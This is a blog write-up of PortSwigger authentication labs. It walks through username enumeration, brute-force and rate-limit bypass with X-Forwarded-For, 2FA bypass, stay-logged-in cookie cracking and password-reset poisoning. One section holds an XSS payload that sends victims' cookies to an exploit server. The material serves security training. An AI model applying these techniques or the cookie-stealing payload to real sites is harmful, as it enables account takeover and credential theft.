---
date: 2021-02-16 23:48:05
layout: post
title: Authentication Vulnerabilities
subtitle: PortSwigger Writeup.
description: >-
  in this blog i've explained how to solve Authentication Vulnerabilities and labs in PortSwigger
image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/331bf776ab4fae30df242f1d22f39d4d942e0f5f/assets/img/Authentication/password-reset-poisoning.svg
optimized_image: https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/331bf776ab4fae30df242f1d22f39d4d942e0f5f/assets/img/Authentication/password-reset-poisoning.svg
category: PortSwigger
tags:
  - PortSwigger
  - injection
author: Mahmoud S. Atia
paginate: true
---

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/5c1c700f256d782ffed92759fbe273f3e5e6e786/assets/img/Authentication/password-reset-poisoning.svg)

# Note

I’ll explain what Authentication vulnerabilities
, describe how vulnerabilities can be detected and exploited, spell out some useful techniques to exploit.

# **Authentication definition**
Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they are who they claim to be. At 
least in part,
websites are exposed to anyone who is connected to the internet by design. Therefore, robust authentication mechanisms are an integral aspect of effective web 
security.

Authentication is the process of verifying that a user really is who they claim to be, whereas authorization involves verifying whether a user is allowed to 
do something.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/authentication%20and%20authorization.png)

------------

Most authentication vulnerabilities are found because the authentication mechanisms are weak. Logic flaws or poor coding in the implementation. many attacks based on brute force but at first of all, we should make enumeration about users.

In portswigger lab gives us
- - Candidate usernames
- - Candidate passwords
to short time of brute forcing

------------

#   some  attacks based on 
1. Status codes 
2. Error messages: whether both the username AND password are incorrect or only the password was incorrect
3. Response times


------------

 
# Open Burp Suite and start to solve labs

# Lab: Username enumeration via different responses


 
Access the lab and click my account,
 try to log in with username and password,
 intercept the request and send it to the intruder 
 we don’t have a username or password so set at the first username you enter and click add § for knowing the real username from the length
 go to the Payloads and past the Candidate usernames list then click start attack.
 Sort by length. 
 
 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/1.png)
 know we know username
 
>  ag

 repeat all steps with replacing Candidate usernames with Candidate passwords and put real username ag
 sort by length 
 know we know real password.
 
>  121212

 ![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2.png)
 
>  ag:121212

------------

# Lab: Username enumeration via subtly different responses
Access the lab the try to log in with any username and password then intercept the request,send to intruder, select username you enter and click add §
go to Payload and add Candidate usernames
then go to Options scroll to Grep – Extract and click Fetch response.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2-1.png)

Look there is an error message 
> Invalid username or password
Mark it and click Refetch responses then ok
**start attack**
sort by warning
> Invalid username or password
at first, we add Invalid username or password(.) dot is a different error message 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2-2.png)

we got username 
repeat all steps with put correct username that we got antivirus and replace Candidate usernames to Candidate passwords then we got the password


![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2-3.png)

------------

# Lab: Username enumeration via response timing

After some trying to brute force login we got bock 
> IP blocked

to bypass this we can use
> proxy chane 
> ip ratio
> vps 
> X-Forwarded-For
So we would use 
> X-Forwarded-For
also, we will need to know the time of response so w will need to increase the time of response so we will inject the password with length to take time to verify it.
 Intercept the request send to repeater but after some sending requests we got block 
>  IP Bloked

so try to add 
> X-Forwarded-For: 500

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/3-1.png)
Lol we bypass 
> IP Blocked

So send the requests to intruder we need to select two payloads first
> X-Forwarded-For: 500 

second payload username and add § and inject password with large length like

- H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3
- H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3H3X0S3

we inject with large length to take time to receive response
select payload type Numbers
step = 1
select number format 

> 0 [0/1/2/3/4/5/6/7/8/9]

select Attack type Pitchfork to use multi payloads, second payload username

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/3-1.png)

we got the username,

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/3-4.png)

repeat all steps with using the correct username and add Candidate passwords.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/3-5.png)

we got the password

------------

# Lab: Broken brute-force protection, IP block
If we test to login with the credentials

> wiener:peter

ok login successful 
now we need to log with Victim's username: 
carlos
if we try to brute force we will block [IP Block] ok try again to login with our credentials 

> wiener:peter

 login successfully now we bypass the block 
 so we should brute force the password of the Victim's username: 
carlos 
and between requests, we should log with our credentials 
> wiener:peter
 
 portswigger give us Candidate passwords [passwords list] to short time 
 but we need to put our password between two passwords to make a valid world list so scarp Candidate passwords from source code and replace <br> to \n peter [new line and write peter]

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/4-1.png)

 in username world list we should put 
>  wiener 

 [new line and write carlos] should wiener to peter and carlos to the Candidate passwords, so send the request to intruder select Attack type Pitchfork add two payloads click start attack.
 Sort by statues to 
> 302 

then sort Payload1 
> carlos 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/4-3.png)


you get the password

------------

# Lab: Username enumeration via account lock
We should enumerate a valid username then brute-force this user's password, like in previous lab.
Enumeration the username

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/5-1.png)

Enumeration the password

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/5-2.png)

Now we got username and password
Lab Solved

------------

# Lab: Broken brute-force protection, multiple credentials per request

in this lab it may take much time to understand :). if we try to log in with Victim's username: carlos and any password and see the request format.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Broken-brute-force-protection-multiple-credentials-per-request-1.png)

it is jscon format, so we will try to bypass authentication by make a password last and make at as array and send it in one request so it will try each password and we will get response 302 Found
show resopnse in browser.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Broken-brute-force-protection-multiple-credentials-per-request-2.png)

lab solved

------------

# Lab: 2FA simple bypass
This lab's two-factor authentication can be bypassed. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, access Carlos's account page.
In this lab we have
>   Your credentials: wiener:peter
>  Victim's credentials carlos:montoya
if we try to login with 
> carlos:montoya  
There is 4-digit security code send to email

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2FA%20simple%20bypass-1.png)

But we don’t have access to this email but let’s try to bypass 2FA look at URL
~~https://target-ac3a1fc51e548cc580d584c100e6001c.web-security-academy.net/login2
~~
 
delete
> /login2

from URL and enter then click My account we bypass 2FA

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2FA%20simple%20bypass-2.png)


------------

# Lab: 2FA broken logic
Try to login with our credentials: 
> wiener:peter

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2FA%20broken%20logic-1.png)

there is 2FA and 4-digit security code sent to the email client already we have access to this email but try to bypass this 2FA by intercepting the request before sending 4-digit security code and submit send it to intruder and Change the value of the verify parameter to
>  carlos 

and set an invalid 2FA code and 
click add § select 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2FA%20broken%20logic-2.png)

stat attack 
sort by status 
> 302

we found 302 this is the code 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/2FA%20broken%20logic-3.png)


click show requests in the browser

# other mechanisms

------------

# Lab: Offline password cracking
As in Lab: Brute-forcing a stay-logged-in cookie we will get the cookies of
> wiener 

account and know the mechanism of cookies generation  
> wiener:51dc30ddc473d43a6011e9ebba6ca770

now we will search for other bugs to get the cookies off 
> carlos 

to solve the lab go home see the posts, there is input fields let’s check if there is XSS.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Offline%20password%20cracking-1.png)

there is no filter for 
<>

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Offline%20password%20cracking-2.png)

let’s try to steal cookies
we will get the cookies on our server on 
>exploit-ac971fe81f9e2a6880735ff0010d0025.web-security-academy.net

inject this in the payload 

> <script>document.location='exploit-ac971fe81f9e2a6880735ff0010d0025.web-security-
> academy.net/exploit'+document.cookie</script>


Go to access log see this log 
Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Offline%20password%20cracking-3.png)


These are the cookies 
 > Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
 
username:md5Password then base64-encode
decode base64 
carlos:26323c16d5f4dabff3bb136f2460a943
 name is 
> carlos

go to https://www.md5online.org/md5-decrypt.html
> onceuponatime equal 26323c16d5f4dabff3bb136f2460a943

now we have a username and password 
login with this credential
and delete the account 
Lab solved 

------------

# Lab: Brute-forcing a stay-logged-in cookie

In this lab, we will guess the mechanism of generation of the cookies then brute force the cookies for 
> carlose

Ok let’s try to solve the lab 
open burp suite login with 
> wiener:peter 

click stay-logged-in to save cookies and sessions in our browser, go to burp and see the requests.

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Brute-forcing%20a%20stay-logged-in%20cookie-1.png)

> d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw

its base64 encoded go to Decoder
> wiener:51dc30ddc473d43a6011e9ebba6ca770

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Brute-forcing%20a%20stay-logged-in%20cookie-2.png)

The we have username 
**[ wiener ] and [ : ] and [ 51dc30ddc473d43a6011e9ebba6ca770 ]**
go to

https://www.md5online.org/md5-decrypt.html

> 51dc30ddc473d43a6011e9ebba6ca770 
is 
> peter 
Its the password, now we know the mechanism 
 > username:MD5password the encode as Base64
logout from wiener account then send the *GET/* request to intruder, select stay-logged-in= §§
in payload add 
> Candidate passwords 
In payload processing add 
1. Hash: MD5
2. ADD Prefix: carlos:
3. Base64-encode 
4. in Grep – Extract 
5. match Update email 
6. start attack 
7. sort by submit 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Brute-forcing%20a%20stay-logged-in%20cookie-3.png)

click show request in browser.

------------

# Lab: Password reset broken logic
This lab's password reset functionality is vulnerable so let’s try to reset the password of 
> wiener 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20broken%20logic-1.png)

this is the URL to reset the password

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20broken%20logic-2.png)
 
intercept the request to change the password and change wiener to carlos
 
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20broken%20logic-3.png)

and enter new password H3X0S3
try to login with 
> carlos:H3X0S3

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20broken%20logic-4.png)

------------

# Lab Password reset poisoning via middleware
try to reset the password of 
> wiener 
intercept the request and change 
> wiener
to 
> carlos 
Add this header X-Forwarded-Host: your exploit server to receive the link of reset password

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20poisoning%20via%20middleware-1.png)
 
this is the token 
> Imv36UMaM43onE42vZWIaxptuP4mFPSx

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20poisoning%20via%20middleware-2.png)

see the format of reset password for wiener
 
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20reset%20poisoning%20via%20middleware-3.png)

so the link to reset the password will be

 https://target-ac441f671fd98a2b8080502200560048.web-security-academy.net/forgot-password?temp-forgot-password-token=Imv36UMaM43onE42vZWIaxptuP4mFPSx
 
open URL 
 set password 
> H3X0S3 

try to login

>  carlos:H3X0S3

lab solved

------------

# lab Password brute-force via password change
After login with credentials: 
> wiener:peter
 
 we found that we can change the password of 
>  wiener 
>
 put any password in new password input and different password in confirm new password
we will see [New passwords do not match]
then intercept the request send the request to the repeater and send a request we found [New passwords do not match] 

 
![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20brute-force%20via%20password%20change-1.png)

 
 send to the intruder and change
> wiener

to
> carlos 

[Victim's username] select current password parameter and add §§
 add payload list Candidate passwords and match Current password is incorrect 
 start attack
 sort by warning 

![](https://raw.githubusercontent.com/H3X0S3/H3X0S3.github.io/master/assets/img/Authentication/Password%20brute-force%20via%20password%20change-2.png)

the password of 
> carlos

is 
> maggie

Lab solved 

# HTTP basic authentication

HTTP basic authentication is a simple challenge and response mechanism with which a server can request authentication information (a user ID and password) from a client. The client passes the authentication information to the server in an Authorization header. The authentication information is in base-64 encoding.

    <?php
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="My Realm"');
        header('HTTP/1.0 401 Unauthorized');
        echo 'Text to send if user hits Cancel button';
        exit;
    } else {
        echo "<p>Hello {$_SERVER['PHP_AUTH_USER']}.</p>";
        echo "<p>You entered {$_SERVER['PHP_AUTH_PW']} as your password.</p>";
    }
    ?>
   


 Base64 encoding

    1. Client requests a page.
    2. The server sends back a 401 status code, which indicates that the client needs to authenticate.
    3. The client sends the request again for the page but this time includes the authentication information input by the user. The username and password are encoded using Base64 (not encrypted).
    
# HTTP Digest Authentication

  Unlike the plaintext scheme used by Basic authentication, Digest authentication has the client send a hash of the client's information over the communication channel, therefore the client's user name and password are never sent over the network.
  Digest authentication works well over the Internet, making Digest authentication better-suited for that environment than Windows authentication.

        <?php
    $realm = 'Restricted area';

    //user => password
    $users = array('admin' => 'mypass', 'guest' => 'guest');

    if (empty($_SERVER['PHP_AUTH_DIGEST'])) {
        header('HTTP/1.1 401 Unauthorized');
        header('WWW-Authenticate: Digest realm="'.$realm.
               '",qop="auth",nonce="'.uniqid().'",opaque="'.md5($realm).'"');

        die('Text to send if user hits Cancel button');
    }

    // analyze the PHP_AUTH_DIGEST variable
    if (!($data = http_digest_parse($_SERVER['PHP_AUTH_DIGEST'])) ||
        !isset($users[$data['username']]))
        die('Wrong Credentials!');

    // generate the valid response
    $A1 = md5($data['username'] . ':' . $realm . ':' . $users[$data['username']]);
    $A2 = md5($_SERVER['REQUEST_METHOD'].':'.$data['uri']);
    $valid_response = md5($A1.':'.$data['nonce'].':'.$data['nc'].':'.$data['cnonce'].':'.$data['qop'].':'.$A2);

    if ($data['response'] != $valid_response)
        die('Wrong Credentials!');

    // ok, valid username & password
    echo 'You are logged in as: ' . $data['username'];

    // function to parse the http auth header
    function http_digest_parse($txt)
    {
        // protect against missing data
        $needed_parts = array('nonce'=>1, 'nc'=>1, 'cnonce'=>1, 'qop'=>1, 'username'=>1, 'uri'=>1, 'response'=>1);
        $data = array();
        $keys = implode('|', array_keys($needed_parts));

        preg_match_all('@(' . $keys . ')=(?:([\'"])([^\2]+?)\2|([^\s,]+))@', $txt, $matches, PREG_SET_ORDER);

        foreach ($matches as $m) {
            $data[$m[1]] = $m[3] ? $m[3] : $m[4];
            unset($needed_parts[$m[1]]);
        }

        return $needed_parts ? false : $data;
    }
    ?>
    
# Note

    1. the client generates hash1 (HA1) by doing an MD5 hash of username:realm:password.
    2. the client generates hash2 (HA2) by running an MD5 hash of method:URI.
    3. the client generates the response hash by running an MD5 hash of HA1:nonce:nonceCount:clientNonce:qop:HA2.
    


- Note: The big difference between ”Basic" and ”Digest" Authentication is that with digest authentication, the password is never sent over the wire.
- Note: The “opaque” value is a string of data, specified by the server, that should be returned by the client unchanged.
   


   ![](https://i.giphy.com/media/l4FAPaGGeB7D1LfIA/giphy.webp)
